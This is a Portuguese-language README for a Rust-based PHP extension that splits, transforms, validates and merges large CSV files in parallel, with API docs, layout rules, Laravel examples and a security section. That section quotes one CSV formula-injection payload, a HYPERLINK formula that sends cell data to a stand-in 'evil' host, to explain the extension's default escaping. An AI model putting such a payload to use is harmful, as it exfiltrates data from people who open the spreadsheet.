# Parallel (Rust)

Extensão PHP escrita em Rust para processamento paralelo de arquivos CSV em pipelines de ETL. Substitui fluxos baseados em `pcntl_fork` com performance 100-500x superior.

## Por que existe

ETLs em PHP tradicionalmente usam `pcntl_fork` para paralelizar o processamento de arquivos grandes. Isso tem limitações:

- Só funciona em CLI (não funciona em PHP-FPM)
- Cada fork copia a memória inteira do processo PHP (centenas de MB com Laravel bootado)
- Não é portável (Windows não tem `pcntl`)
- Tempo de boot dos workers é alto

Esta extensão resolve esses pontos usando threads nativas do Rust com a biblioteca `rayon`. Todo o pipeline (split, parse, transform, validate, merge) roda em Rust paralelo numa única chamada PHP.

## Performance

Benchmark de referência com arquivo CSV de 200MB e ~5M linhas:

| Etapa | PHP + pcntl | rust_etl |
|---|---|---|
| Split do arquivo | ~1-2s | 30ms |
| Processamento paralelo | ~30-60s | 75ms |
| Merge | ~500ms | 25ms |
| **Total** | **~40-70s** | **~130ms** |

## Requisitos

- PHP 8.0 a 8.4 (NTS ou ZTS)
- Rust toolchain (apenas para build)
- LLVM/Clang (para bindgen)

---

## Instalação

### macOS

#### 1. Dependências

```bash
# Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# LLVM (necessário para o bindgen do ext-php-rs)
brew install llvm

# PHP com headers de desenvolvimento
brew install php@8.4
```

#### 2. Variáveis de ambiente

```bash
export PATH="$(brew --prefix php@8.4)/bin:$PATH"
export PHP_CONFIG="$(brew --prefix php@8.4)/bin/php-config"
export PHP="$(brew --prefix php@8.4)/bin/php"
export LIBCLANG_PATH="$(brew --prefix llvm)/lib"
```

#### 3. Configuração do linker (obrigatório no macOS)

Crie `.cargo/config.toml` na raiz do projeto:

```toml
[target.aarch64-apple-darwin]
rustflags = [
    "-C", "link-arg=-undefined",
    "-C", "link-arg=dynamic_lookup",
]

[target.x86_64-apple-darwin]
rustflags = [
    "-C", "link-arg=-undefined",
    "-C", "link-arg=dynamic_lookup",
]
```

#### 4. Build

```bash
cargo build --release
```

#### 5. Instalação

```bash
# Diretório para extensões
mkdir -p ~/php-ext
cp target/release/libparallel.dylib ~/php-ext/parallel.so
```

#### 6. Configuração no php.ini

Descubra o arquivo ini carregado:

```bash
php --ini
```

Adicione ao `php.ini`:

```ini
extension_dir = "/Users/SEU_USUARIO/php-ext"
extension = parallel.so
```

#### 7. Verificação

```bash
php -m | grep parallel
php --re parallel
```

#### Observação para Laravel Herd

O Herd não distribui `php-config`, então use o PHP do Homebrew para compilar. Depois, copie a `.so` para o extension_dir usado pelo Herd e edite o `php.ini` em `~/Library/Application Support/Herd/config/php/<versao>/php.ini`.

### Linux (Ubuntu/Debian)

#### 1. Dependências

```bash
# Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# PHP dev headers e libclang
sudo apt update
sudo apt install -y php8.4-dev libclang-dev build-essential pkg-config
```

#### 2. Build

```bash
cargo build --release
```

Gera `target/release/libparallel.so`.

#### 3. Instalação

```bash
sudo cp target/release/libparallel.so "$(php-config --extension-dir)/parallel.so"
```

#### 4. Configuração

Crie `/etc/php/8.4/mods-available/parallel.ini`:

```ini
extension=parallel.so
```

Habilite para CLI e FPM:

```bash
sudo phpenmod -v 8.4 parallel
sudo systemctl restart php8.4-fpm
```

#### 5. Verificação

```bash
php -m | grep parallel
```

### Notas de compilação

Binários **não são portáveis** entre:
- Arquiteturas diferentes (ARM64 macOS ≠ x86_64 Linux)
- Versões majors do PHP (8.2 ≠ 8.4)
- Builds NTS vs ZTS

Compile uma vez em cada ambiente de destino.

---

## Uso no PHP

A extensão expõe a classe global `FileProcessor` com quatro métodos.

### Instanciação

```php
$processor = new FileProcessor();
```

O construtor não recebe argumentos. Uma instância pode ser reutilizada para múltiplos arquivos.

### `splitFile(string $inputPath, string $outputDir, int $chunks): array`

Divide um arquivo CSV em N chunks, respeitando quebras de linha (nunca corta uma linha no meio). Cada chunk é escrito como `input_N.csv` no diretório de saída.

**Parâmetros:**

- `$inputPath` — caminho absoluto do arquivo de entrada
- `$outputDir` — diretório onde os chunks serão escritos (criado se não existir)
- `$chunks` — número de chunks/threads

**Retorno:** array com a contagem de linhas por chunk. Ex: `[349019, 349018, ...]`.

**Exemplo:**

```php
$processor = new FileProcessor();
$counts = $processor->splitFile(
    '/var/data/entrada.csv',
    '/tmp/etl_job_123',
    16
);

echo "Total de linhas: " . array_sum($counts);
// Cria /tmp/etl_job_123/input_0.csv até input_15.csv
```

### `processChunks(string $dir, int $chunks, string $inputDelimiter, string $outputDelimiter, bool $skipHeader, string $columnsJson, ?bool $escapeFormulas = true, ?string $quoteStyle = 'necessary'): array`

Processa todos os chunks em paralelo aplicando transformações e validações definidas no layout. Lê `input_N.csv`, gera `output_N.csv` para cada chunk.

**Parâmetros:**

- `$dir` — diretório contendo os chunks gerados pelo `splitFile`
- `$chunks` — número de chunks (mesmo valor usado no split)
- `$inputDelimiter` — delimitador do CSV de entrada (ex: `";"`)
- `$outputDelimiter` — delimitador do CSV de saída (ex: `";"`)
- `$skipHeader` — se `true`, ignora a primeira linha de cada chunk
- `$columnsJson` — JSON serializado com a configuração de colunas (ver seção **Layout**)

**Retorno:** array com três inteiros: `[input_total, output_total, invalid_total]`.

- `input_total` — total de linhas lidas
- `output_total` — total de linhas válidas escritas
- `invalid_total` — total de linhas descartadas por falha de validação

**Exemplo:**

```php
$layout = json_encode([
    ['in' => 0, 'out' => 0, 'ops' => ['digits_only', 'pad_left:11:0'], 'validate' => 'cpf'],
    ['in' => 1, 'out' => 1, 'ops' => ['digits_only']],
    ['in' => 2, 'out' => 2, 'ops' => ['digits_only']],
]);

$totals = $processor->processChunks(
    '/tmp/etl_job_123',
    16,
    ';',
    ';',
    false,
    $layout
);

[$in, $out, $invalid] = $totals;
echo "Processadas: $in | Válidas: $out | Inválidas: $invalid";
```

### `mergeFiles(string $inputDir, string $outputPath, int $chunks): int`

Concatena `output_0.csv` até `output_N.csv` em um único arquivo final.

**Parâmetros:**

- `$inputDir` — diretório contendo os chunks processados
- `$outputPath` — caminho absoluto do arquivo final
- `$chunks` — número de chunks

**Retorno:** total de linhas no arquivo final.

**Exemplo:**

```php
$total = $processor->mergeFiles(
    '/tmp/etl_job_123',
    '/var/data/saida.csv',
    16
);

echo "Arquivo final gerado com $total linhas";
```

### `processParallel(string $inputPath, string $outputPath, int $chunks, string $inputDelimiter, string $outputDelimiter, bool $skipHeader, string $columnsJson, ?bool $escapeFormulas = true, ?string $quoteStyle = 'necessary'): array`

Pipeline completo em uma única chamada: mmap do input, divide em N ranges line-aligned, processa cada range em uma thread rayon (cada uma escrevendo num buffer de memória), concatena os buffers no output final.

É o método **recomendado** para o caso comum. Não cria temp files, não precisa de diretório de trabalho, e faz ~3x menos I/O de disco comparado ao fluxo de 3 chamadas `splitFile` + `processChunks` + `mergeFiles`. Ordem de linhas é preservada porque os buffers são escritos em ordem de chunk.

**Parâmetros:**

- `$inputPath` — caminho absoluto do arquivo CSV de entrada
- `$outputPath` — caminho absoluto do arquivo CSV final
- `$chunks` — número de threads/ranges de processamento
- `$inputDelimiter` / `$outputDelimiter` — ex: `";"`, `","`
- `$skipHeader` — se `true`, ignora a primeira linha do arquivo (uma única vez, não por chunk)
- `$columnsJson` — layout JSON (ver seção **Layout**)
- `$escapeFormulas` — opcional, default `true`. Neutraliza CSV formula injection

**Retorno:** `[input_total, output_total, invalid_total]`.

**Exemplo:**

```php
$totals = $processor->processParallel(
    '/var/data/clientes.csv',
    '/var/data/clientes_normalizados.csv',
    16,
    ';',
    ';',
    false,
    $layout
);

[$in, $out, $invalid] = $totals;
```

### `processParallelDenormalize(string $inputPath, string $outputPath, int $chunks, string $inputDelimiter, string $outputDelimiter, bool $skipHeader, int $staticCols, int $groupSize, string $columnsJson, ?bool $escapeFormulas = true, ?string $quoteStyle = 'necessary'): array`

Variante de `processParallel` com **row fan-out**: cada linha de entrada com formato desnormalizado (prefixo estático + N grupos de colunas) vira múltiplas linhas de saída, uma por grupo. Pipeline paralelo via mmap + rayon, sem temp files.

**Formato do input esperado:** `<S colunas estáticas> + <M grupos de G colunas cada>`. Exemplo com `staticCols=1, groupSize=2`:

```
Input  (doc + 3 pares ddd/phone):
  33176825404;82;987148038;82;987432606;82;987694281

Output (1 linha por grupo, prefixo replicado):
  33176825404;82;987148038
  33176825404;82;987432606
  33176825404;82;987694281
```

**Parâmetros:**

- `$inputPath`, `$outputPath` — caminhos absolutos
- `$chunks` — número de threads paralelas
- `$inputDelimiter`, `$outputDelimiter`
- `$skipHeader` — pula a primeira linha do input (só o primeiro chunk)
- `$staticCols` — quantas colunas no início do input são **estáticas** (replicadas em cada linha de saída). No exemplo, 1 (document)
- `$groupSize` — tamanho de cada grupo que se repete. No exemplo, 2 (ddd + phone)
- `$columnsJson` — layout de **uma linha de saída normalizada**. Ver seção "Layout em modo denormalize"
- `$escapeFormulas`, `$quoteStyle` — idênticos a `processParallel`

**Retorno:** `[input_rows, output_rows, invalid_rows]`:

- `input_rows` — linhas lidas do arquivo de entrada
- `output_rows` — linhas efetivamente escritas no arquivo de saída (após fan-out + validação)
- `invalid_rows` — tentativas de saída (1 por grupo) dropadas por algum `validate`

### Layout em modo denormalize

Em `processParallelDenormalize`, os índices `in` do layout se referem a uma **linha virtual** de largura `staticCols + groupSize`, **não** ao arquivo de entrada bruto.

Continuando o exemplo acima (`staticCols=1, groupSize=2`):

| `in` virtual | Mapeia para input bruto | Semântica |
|---|---|---|
| `0` | coluna 0 (sempre) | document (estática) |
| `1` | coluna `1 + 2*i` | ddd do grupo i |
| `2` | coluna `2 + 2*i` | phone do grupo i |

A extensão itera `i = 0, 1, 2, ...` (quantos grupos completos existirem) e aplica o layout uma vez por grupo.

**Edge cases:**

- Linha com menos colunas que `staticCols` → pulada silenciosamente (zero saídas)
- Grupo parcial no fim (ex.: sobrou 1 coluna com `groupSize=2`) → ignora o lixo, emite apenas os grupos completos
- `in` maior que `staticCols + groupSize - 1` → **erro** no parse (bounds check antes de abrir o arquivo)
- Validadores rodam **por linha de saída**: uma combinação `(doc, dddN, phoneN)` pode ser inválida enquanto outra `(doc, dddM, phoneM)` do mesmo doc é válida — ambos casos tratados corretamente

**Exemplo completo (caso real: document + múltiplos DDD/phone):**

```php
$processor = new FileProcessor();

$layout = json_encode([
    ['in' => 0, 'out' => 0, 'ops' => ['digits_only'], 'validate' => 'document'],
    ['in' => 1, 'out' => 1, 'ops' => ['digits_only'], 'validate' => 'area_code'],
    ['in' => 2, 'out' => 2, 'ops' => ['digits_only'], 'validate' => 'phone'],
]);

$totals = $processor->processParallelDenormalize(
    'entrada.csv',     // ex: 33176825404;82;987148038;82;987432606;82;987694281
    'saida.csv',       // ex: 33176825404;82;987148038 (1 linha por grupo)
    16,
    ';', ';',
    false,
    1,                 // staticCols = 1 (document)
    2,                 // groupSize = 2 (ddd + phone por grupo)
    $layout,
    false,             // escape_formulas OFF (bcp)
    'never'            // quote_style OFF (bcp)
);

[$in, $out, $invalid] = $totals;
echo "Entrada: $in linhas | Saída: $out linhas | Dropadas: $invalid\n";
```

### `processFile(string $inputPath, string $outputPath, string $inputDelimiter, string $outputDelimiter, bool $skipHeader, string $columnsJson, ?bool $escapeFormulas = true, ?string $quoteStyle = 'necessary'): array`

Versão single-thread de `processParallel`. Útil para arquivos muito pequenos onde o overhead de splitting supera o ganho de paralelismo, ou quando você quer determinismo exato para debugging.

**Retorno:** `[input_count, output_count, invalid_count]`.

**Exemplo:**

```php
$totals = $processor->processFile(
    '/var/data/arquivo.csv',
    '/var/data/saida.csv',
    ';',
    ';',
    true,
    $layout
);
```

---

## Layout declarativo

O parâmetro `$columnsJson` define o pipeline de transformação de cada coluna. Formato:

```json
[
    {
        "in": 0,
        "out": 0,
        "ops": ["digits_only", "pad_left:11:0"],
        "validate": "cpf"
    },
    {
        "in": 1,
        "out": 1,
        "ops": ["digits_only"]
    }
]
```

### Campos

- **`in`** (obrigatório, int) — índice da coluna no CSV de entrada (0-based)
- **`out`** (obrigatório, int) — índice da coluna no CSV de saída (0-based)
- **`ops`** (obrigatório, array de strings) — lista ordenada de transformações
- **`validate`** (opcional, string) — validador aplicado após as transformações. Se falhar, a linha é descartada

### Operações disponíveis (`ops`)

| Operação | Descrição | Exemplo |
|---|---|---|
| `trim` | Remove espaços do início e fim | `" abc "` → `"abc"` |
| `digits_only` | Mantém apenas dígitos | `"(11) 98765-4321"` → `"11987654321"` |
| `uppercase` | Converte para maiúsculas | `"João"` → `"JOÃO"` |
| `lowercase` | Converte para minúsculas | `"João"` → `"joão"` |
| `pad_left:N:C` | Preenche à esquerda até N chars com o char C | `"123"` com `pad_left:5:0` → `"00123"` |
| `strip_ddi:DDI` | Remove o DDI do início da string | `"5511987654321"` com `strip_ddi:55` → `"11987654321"` |
| `remove_leading_zeroes` | Remove zeros à esquerda | `"0001234"` → `"1234"` |
| `cpf_canonical` | Canonicaliza como CPF (11 dígitos) e valida. Se inválido, retorna `""` | `"123.456.789-09"` → `"12345678909"` |
| `cnpj_canonical` | Canonicaliza como CNPJ (14 dígitos) e valida. Se inválido, retorna `""` | `"11.222.333/0001-81"` → `"11222333000181"` |
| `document_canonical` | Detecta automaticamente CPF ou CNPJ e canonicaliza. Se nenhum dos dois, retorna `""` | `"123.456.789-09"` → `"12345678909"`; `"11222333000181"` → `"11222333000181"` |

As operações são aplicadas **na ordem declarada**. Em `["digits_only", "pad_left:11:0"]`, primeiro remove não-dígitos, depois preenche com zeros.

**Padrão `canonical + not_blank`:** ops terminadas em `_canonical` retornam `""` quando inválidas (campo vira em branco, mas a linha fica). Se o campo é obrigatório (ex: chave primária do registro), combine com o validator `not_blank` — aí a linha inteira é descartada. Ver seção de validadores.

### Validadores disponíveis (`validate`)

| Validador | Regra |
|---|---|
| `cpf` | 11 dígitos, dígitos verificadores válidos, rejeita sequências repetidas (ex: `11111111111`) |
| `cnpj` | 14 dígitos, dígitos verificadores válidos, rejeita sequências repetidas. Aceita formatado (`11.222.333/0001-81`) |
| `document` | Aceita CPF **ou** CNPJ. Útil quando a coluna `document` pode ser de qualquer dos dois tipos |
| `area_code` | DDD brasileiro (2 dígitos). Lista oficial de áreas válidas — rejeita códigos inexistentes como `10`, `23`, `52`, `78`, etc |
| `phone` | Telefone **sem DDD** (assinante). Fixo: 8 dígitos começando com 2-8; celular: 9 dígitos começando com 9 |
| `email` | Heurística: `local@dominio` com ponto no domínio, sem espaços, um único `@` |
| `regex:<padrão>` | Sintaxe regex da crate [`regex`](https://docs.rs/regex/). Compilado uma vez por layout |
| `not_blank` | Campo não pode estar vazio. Combina com `_canonical` ops para dropar linhas em que o campo-chave ficou vazio após canonicalização |

**Nota sobre `phone`:** a validação é só do assinante (sem DDD). Para validar DDD + número completo, use duas colunas separadas com `area_code` e `phone` (espelha o modelo do `DataSanitizer` PHP onde DDD e telefone vivem em campos separados).

Se uma coluna com `validate` falhar, a **linha inteira** é descartada e contabilizada em `invalid_count`.

**Campo-chave obrigatório (ex: document).** Para forçar validade de um campo e descartar a linha se inválido, combine op canonical + `not_blank`:

```json
{
    "in": 0,
    "out": 0,
    "ops": ["document_canonical"],
    "validate": "not_blank"
}
```

Fluxo: `document_canonical` aplica digits_only + remove_leading_zeroes + detecta CPF/CNPJ + valida. Se inválido → `""`. Em seguida `not_blank` vê `""` → dropa a linha inteira. Equivale semanticamente ao pipe `digits|document` do `DataSanitizer` combinado com "document obrigatório".

Exemplos:

```json
[
    {"in": 0, "out": 0, "ops": ["digits_only"], "validate": "cnpj"},
    {"in": 1, "out": 1, "ops": ["trim", "lowercase"], "validate": "email"},
    {"in": 2, "out": 2, "ops": ["trim"], "validate": "length:3:50"},
    {"in": 3, "out": 3, "ops": [], "validate": "regex:^[A-Z]{2}\\d{4}$"}
]
```

### Validação estrita do layout

A partir da versão atual, o layout JSON é validado estritamente no início da chamada. Isso significa que **ops desconhecidas, validadores desconhecidos ou parâmetros inválidos geram erro imediato** — não são mais ignorados silenciosamente. Mensagens de erro incluem o índice da coluna para facilitar o diagnóstico:

```
column 2: ops[1]: unknown operation 'ditigs_only'; expected one of: trim, digits_only, uppercase, lowercase, pad_left, strip_ddi
column 3: unknown validator 'passport'; expected one of: cpf, phone_br, cnpj, email, length, regex
column 1: length requires both min and max: 'length:<min>:<max>'
```

Erros do layout aparecem como exceção PHP antes de qualquer arquivo ser aberto.

---

## Exemplo completo: pipeline ETL

### Recomendado: `processParallel` (single-call, sem temp dir)

```php
<?php

class EtlProcessor
{
    private FileProcessor $rust;
    private int $chunks;

    public function __construct(int $chunks = 16)
    {
        $this->rust = new FileProcessor();
        $this->chunks = $chunks;
    }

    public function process(string $inputFile, string $outputFile, array $layout): array
    {
        $t0 = microtime(true);

        $totals = $this->rust->processParallel(
            $inputFile,
            $outputFile,
            $this->chunks,
            ';',
            ';',
            false,
            json_encode($layout)
        );

        return [
            'input_count' => $totals[0],
            'output_count' => $totals[1],
            'invalid_count' => $totals[2],
            'elapsed_ms' => round((microtime(true) - $t0) * 1000, 2),
        ];
    }
}
```

### Row fan-out: desnormalizar um CSV wide em narrow

Padrão comum em pipelines ETL: o arquivo de entrada tem o documento + múltiplos pares (DDD, phone) na mesma linha, e o consumidor (ex: carga bcp no SQL Server) precisa receber uma linha por par, com o documento replicado.

**Input** (cada linha traz 1 doc + N pares DDD/phone):
```
33176825404;82;987148038;82;987432606;82;987694281;82;988189515
33176841000;47;984192969;47;996592586
33176906315;74;999659384;75;998779719;85;987348663;98;984144354
```

**Output esperado** (1 linha por par, doc replicado):
```
33176825404;82;987148038
33176825404;82;987432606
33176825404;82;987694281
33176825404;82;988189515
33176841000;47;984192969
33176841000;47;996592586
33176906315;74;999659384
33176906315;75;998779719
33176906315;85;987348663
33176906315;98;984144354
```

**Código PHP:**

```php
<?php

class DenormalizePhoneRecords
{
    public function run(string $inputFile, string $outputFile, int $chunks = 16): array
    {
        $fp = new FileProcessor();

        // Layout descreve UMA linha de saída (doc, ddd, phone).
        // Em modo denormalize, `in` é o índice da linha virtual de tamanho
        // staticCols + groupSize (aqui: 1 + 2 = 3).
        $layout = json_encode([
            ['in' => 0, 'out' => 0, 'ops' => ['digits_only'], 'validate' => 'document'],
            ['in' => 1, 'out' => 1, 'ops' => ['digits_only'], 'validate' => 'area_code'],
            ['in' => 2, 'out' => 2, 'ops' => ['digits_only'], 'validate' => 'phone'],
        ]);

        $t0 = microtime(true);
        $totals = $fp->processParallelDenormalize(
            $inputFile,
            $outputFile,
            $chunks,
            ';', ';',
            false,
            1,            // 1 coluna estática (document)
            2,            // grupos de 2 colunas (ddd, phone)
            $layout,
            false,        // escape_formulas=false → bcp
            'never'       // quote_style=never → bcp
        );

        return [
            'input_rows'   => $totals[0],
            'output_rows'  => $totals[1],
            'invalid_rows' => $totals[2],
            'elapsed_ms'   => round((microtime(true) - $t0) * 1000, 2),
        ];
    }
}

$result = (new DenormalizePhoneRecords())->run(
    '/var/data/wide.csv',
    '/var/data/normalized.csv'
);
print_r($result);
```

**Saída esperada:** `invalid_rows` conta tentativas de saída (1 por grupo do input) dropadas por algum validator — ex: um grupo com DDD inválido é dropado mesmo que outros grupos do mesmo documento sejam válidos.

### Fluxo de 3 chamadas (quando precisar de checkpoints em disco)

Útil se você quer poder retomar o pipeline depois de um crash, ou inspecionar arquivos intermediários:

```php
<?php

class EtlProcessorCheckpointed
{
    private FileProcessor $rust;
    private int $chunks;

    public function __construct(int $chunks = 16)
    {
        $this->rust = new FileProcessor();
        $this->chunks = $chunks;
    }

    public function process(string $inputFile, string $outputFile, array $layout): array
    {
        $workDir = sys_get_temp_dir() . '/etl_' . uniqid();
        mkdir($workDir, 0755, true);

        try {
            $t0 = microtime(true);

            // 1. Split paralelo
            $this->rust->splitFile($inputFile, $workDir, $this->chunks);

            // 2. Processamento paralelo
            $totals = $this->rust->processChunks(
                $workDir,
                $this->chunks,
                ';',
                ';',
                false,
                json_encode($layout)
            );

            // 3. Merge
            $this->rust->mergeFiles($workDir, $outputFile, $this->chunks);

            return [
                'input_count' => $totals[0],
                'output_count' => $totals[1],
                'invalid_count' => $totals[2],
                'elapsed_ms' => round((microtime(true) - $t0) * 1000, 2),
            ];
        } finally {
            $this->cleanup($workDir);
        }
    }

    private function cleanup(string $dir): void
    {
        foreach (glob("$dir/*") as $file) {
            unlink($file);
        }
        rmdir($dir);
    }
}

// Uso
$processor = new EtlProcessor(chunks: 16);

$result = $processor->process(
    inputFile: '/var/data/clientes.csv',
    outputFile: '/var/data/clientes_normalizados.csv',
    layout: [
        ['in' => 0, 'out' => 0, 'ops' => ['digits_only', 'pad_left:11:0'], 'validate' => 'cpf'],
        ['in' => 1, 'out' => 1, 'ops' => ['digits_only']],
        ['in' => 2, 'out' => 2, 'ops' => ['digits_only']],
    ]
);

print_r($result);
// Array
// (
//     [input_count] => 5584292
//     [output_count] => 5549000
//     [invalid_count] => 35292
//     [elapsed_ms] => 178.54
// )
```

---

## Integração com Laravel

Wrapper sugerido para substituir `FileHandler` + `Process` + `Pool` + `FileCache`:

```php
<?php

namespace App\Helpers\Parallel;

use App\Models\Enrichment\File;
use App\Models\Enrichment\Job;
use FileProcessor;
use RuntimeException;

class RustFileHandler
{
    private FileProcessor $processor;
    private Job $job;
    private File $inputFile;
    private string $inputPath;
    private string $outputPath;
    private int $workers;
    private int $maxWorkers = 16;

    public function __construct(Job $job, File $inputFile)
    {
        $this->processor = new FileProcessor();
        $this->job = $job;
        $this->inputFile = $inputFile;
        $this->inputPath = $inputFile->fullpath;

        $this->setWorkers();
        $this->setOutputPath();
    }

    public function run(array $layout): array
    {
        $this->cleanDirectory();

        $this->processor->splitFile(
            $this->inputPath,
            $this->getCacheInputPath(),
            $this->workers
        );

        $totals = $this->processor->processChunks(
            $this->getCacheInputPath(),
            $this->workers,
            ';',
            ';',
            false,
            json_encode($layout)
        );

        if ($totals[1] === 0) {
            throw new RuntimeException(
                'O arquivo de entrada não contém nenhum registro válido.'
            );
        }

        return [
            'input_record_count' => $totals[0],
            'output_record_count' => $totals[1],
            'invalid_record_count' => $totals[2],
        ];
    }

    public function mergeTo(string $finalOutputPath): int
    {
        return $this->processor->mergeFiles(
            $this->getCacheInputPath(),
            $finalOutputPath,
            $this->workers
        );
    }

    private function setWorkers(): void
    {
        $sizeInMB = (int) ceil(filesize($this->inputPath) / (1024 * 1024));
        $this->workers = min($sizeInMB, $this->maxWorkers);
    }

    private function setOutputPath(): void
    {
        $this->outputPath = $this->job
            ->firstFileOfType(File::TYPE_INPUT)
            ->getPathForParallel();

        if (!is_dir($this->outputPath)) {
            mkdir($this->outputPath, 0755, true);
        }
    }

    private function getCacheInputPath(): string
    {
        return $this->outputPath . '/input';
    }

    private function cleanDirectory(): void
    {
        $path = $this->getCacheInputPath();
        if (!is_dir($path)) {
            mkdir($path, 0755, true);
            return;
        }
        foreach (glob("$path/*") as $file) {
            unlink($file);
        }
    }
}
```

Uso no job:

```php
public function execute()
{
    $job = $this->getJob();
    $this->createEvent('Iniciou a conversão do arquivo de entrada');

    $handler = new RustFileHandler(
        $job,
        $job->firstFileOfType(File::TYPE_INPUT)
    );

    $result = $handler->run([
        ['in' => 0, 'out' => 0, 'ops' => ['digits_only', 'pad_left:11:0'], 'validate' => 'cpf'],
        ['in' => 1, 'out' => 1, 'ops' => ['digits_only']],
        ['in' => 2, 'out' => 2, 'ops' => ['digits_only']],
    ]);

    if ($result['output_record_count'] === 0) {
        throw new EnrichmentJobException(
            'O arquivo de entrada não contém nenhum registro válido.'
        );
    }

    $this->createEvent('Terminou a conversão do arquivo de entrada');
}
```

---

## Tratamento de erros

Os métodos da extensão lançam exceções PHP (`\Exception`) quando há falhas:

- Arquivo não existe ou sem permissão de leitura
- Diretório de saída sem permissão de escrita
- JSON de layout inválido
- Encoding UTF-8 inválido no arquivo (linhas problemáticas são puladas silenciosamente, sem erro)

```php
try {
    $processor->splitFile($path, $dir, 16);
} catch (\Exception $e) {
    Log::error('Falha no split: ' . $e->getMessage());
}
```

---

## Limitações

- **Encoding:** assume UTF-8. Linhas inválidas são ignoradas. Converta arquivos Latin1 antes de processar.
- **Memória:** usa `mmap` no arquivo de entrada. Arquivos maiores que a RAM disponível podem causar swap.
- **Callbacks PHP:** não suporta callbacks PHP dentro do processamento paralelo. Toda lógica deve ser expressa via layout declarativo.
- **Layouts customizados:** para transformações que não existem no conjunto padrão, é necessário estendê-las em Rust e recompilar.

## CSV

O parsing segue RFC 4180 via crate [`csv`](https://docs.rs/csv/): campos entre aspas (`"..."`), delimitador embutido dentro de aspas, aspas escapadas (`""`), e `CRLF`/`LF` são tratados corretamente. Na saída, `csv::Writer` re-quota automaticamente campos que contenham o delimitador configurado ou aspas. O terminador de linha da saída é sempre `\n`.

## Segurança

### CSV formula injection

RFC 4180 não cobre o problema de planilhas (Excel/Sheets/Calc) interpretarem como fórmula qualquer campo que comece com `=`, `+`, `-`, `@`, `\t` ou `\r`. Um CSV derivado de dados externos pode carregar payloads tipo `=HYPERLINK("http://evil/?x="&A1,"clique")` que exfiltram dados da planilha quando abertos pelo usuário final.

A extensão neutraliza isso por default: todo campo de saída que começar com um desses caracteres recebe o prefixo `'` (aspas simples), o que faz a planilha tratar o conteúdo como texto. O parâmetro `$escapeFormulas` das assinaturas `processFile` e `processChunks` é opcional e defaulta para `true`:

```php
// Seguro por default (escape ativo)
$processor->processChunks($dir, $n, ';', ';', false, $layout);

// Opt-in explícito
$processor->processChunks($dir, $n, ';', ';', false, $layout, true);

// Opt-out (APENAS para pipelines internos onde a saída NUNCA abre em planilha)
$processor->processChunks($dir, $n, ';', ';', false, $layout, false);
```

A validação (`validate`) roda sobre o valor **antes** do escape, então CPFs/CNPJs/regex continuam funcionando como esperado — um CPF válido não fica inválido por receber prefixo depois.

Veja [OWASP — CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection) para contexto.

### Saída para SQL Server via `bcp`

O `bcp` (Bulk Copy Program do SQL Server) **não implementa RFC 4180** — ele não entende quoting nem escapes. Para gerar CSVs consumíveis por `bcp`, use o parâmetro `$quoteStyle` com valor `"never"` e desligue o escape de fórmulas:

```php
$processor->processParallel(
    $inputFile,
    $outputFile,
    16,
    ';', ';',
    false,
    $layout,
    false,      // escape_formulas=false — bcp carregaria o ' literal
    'never'     // quote_style=never — bcp carregaria as aspas literais
);
```

**Valores de `$quoteStyle`:**

| Valor | Comportamento |
|---|---|
| `"necessary"` (default) | RFC 4180: quota apenas campos que contenham delimiter, aspas ou newline |
| `"always"` | Quota todos os campos |
| `"never"` | Nunca quota. **Requer** que os dados não contenham o delimiter |

**Garantindo o delimiter limpo:** com `"never"`, se algum campo de saída contiver o delimiter configurado, o output fica corrompido (bcp interpretará como fim de coluna). Responsabilidade do layout manter isso fora:

- Campos numéricos (document, phone, cep): `digits_only` já remove qualquer `;`
- Campos categóricos (record_type, uf): use `constant:X` ou validator `in:...` para restringir a valores conhecidos
- Campos de texto livre (nome, endereço): se o delimiter puder aparecer, ou (a) mude o delimiter pra `|` ou tab, (b) adicione um op que remova o delimiter antes da saída

Line endings: a saída é sempre `\n`. Use `bcp ... -r "\n"` na invocação.

---

## Troubleshooting

### `Unable to load dynamic library`

Confira se a `.so` foi copiada para o `extension_dir` correto:

```bash
php -i | grep extension_dir
```

### `undefined symbol: _zend_empty_string` no macOS

Falta a configuração do linker em `.cargo/config.toml`. Ver seção de instalação macOS.

### `The current version of PHP is not supported`

A versão do `ext-php-rs` usada no build não suporta sua versão do PHP. O projeto hoje pina um commit específico do `ext-php-rs` em `Cargo.toml` para garantir reprodutibilidade:

```toml
ext-php-rs = { git = "https://github.com/davidcole1340/ext-php-rs", rev = "0b8bf6a557948f4bde24d6f7e179d702ba090613" }
```

Se precisar bumpar (ex.: nova versão do PHP), troque o `rev` por um commit mais recente do `master` do upstream e rode `cargo update -p ext-php-rs`.

### Extensão carrega mas classe `FileProcessor` não existe

O `#[php_module]` não está registrando a classe. Confira:

```rust
#[php_module]
pub fn module(module: ModuleBuilder) -> ModuleBuilder {
    module.class::<FileProcessor>()
}
```

### Performance pior que o esperado

- Confirme que compilou com `--release`
- Confirme o número de threads vs cores disponíveis (`nproc` no Linux, `sysctl -n hw.ncpu` no macOS)
- Arquivos muito pequenos (<10MB) têm ganho menor — o overhead fixo domina

---

## Desenvolvimento

### Rodando os testes

A lógica pura (validadores, ops, parsing de layout, pipeline de arquivos) é isolada do layer PHP via a feature Cargo `extension` (default). Para testar sem precisar do runtime PHP:

```bash
cargo test --no-default-features
```

Os testes cobrem validadores (cpf, phone_br, cnpj, email, length, regex), operações (incluindo casos no-op onde o `Cow` evita alocação), parsing estrito de JSON e o pipeline completo `split → process_chunks → merge` com arquivos temporários.

Para compilar a extensão PHP propriamente dita (com `ext-php-rs` linkado):

```bash
cargo build --release
```